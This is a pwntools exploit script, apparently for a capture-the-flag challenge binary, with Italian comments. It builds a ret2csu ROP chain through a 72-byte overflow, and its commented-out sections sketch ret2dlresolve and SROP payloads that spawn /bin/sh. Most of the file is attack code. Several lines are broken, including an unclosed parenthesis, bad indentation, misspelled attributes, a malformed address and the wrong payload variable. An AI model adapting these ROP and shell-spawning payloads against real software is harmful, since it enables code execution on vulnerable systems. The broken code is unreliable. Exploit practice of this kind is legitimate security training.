from pwn import *

context.binary = exe = ELF("./chall"

if args.GDB:
    r = gdb.debug("./chall", """
    b *0x4011d1
    c
""")
    else:
    r = process("./chall")

# csu init e' ad indirizzi del binario visto che setta i registri
popper = 0x40123a
caller = 0x401220

payload = b"A" * 0x48

# rbx, rbp, r12, r13, 14, r15, func addr
payload += flat([
    popper,
    0x0,
    0x1,
    0xdeadbeef,
    0xcafebabe,
    0x0badf00d,
    exe.sym.why_am_i_here,
    caller
])

'''
pwntools ha anche la fubzione p[er farlo da solo:
rop.ret2csu() -> vedi su docs pwntools

'''

'''
RET2DLRESOLVE:

rop = ROP(exe)
dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])

assert not dlresolve.unreliable
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload = b"a" * 0x48
payload += rop.chain()

r.send(payload)
sleep(1)
r.send(dlresolve.payload)
r.interactive()

'''



'''
SROP:
frame = SigreturnFrame(kernel='amd64')
# read su bss per farre stack pivoting

frame.rd = 0
frame.rsi = exe.bss()
frame.rdx = 0x1000
frame.rip = exe.plt.read
frame.rsp = exe.bss() + 0x10

payload = b"A" * 0x48
payload += flat([
    0x4011a4,
    0xf,
    0x40199,
])

r.send(payload)

# posso fare una reead arbitraria

sleep(1)
# read arbitraria
payload2 = b"/bin/sh".ljust(0x10, b"\x00")

frame = Sigreturnframe(kernel='amd64')
frame.rax = 0x3b
frame.rdi = exe.bss()
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = 0x401199


# execve
payload += flat([
    0x4011a4,
    0xf,
    0x401199

])
payload += bytes(frame)
r.send(payload)



'''

'''
BROP:
blind rop

'''














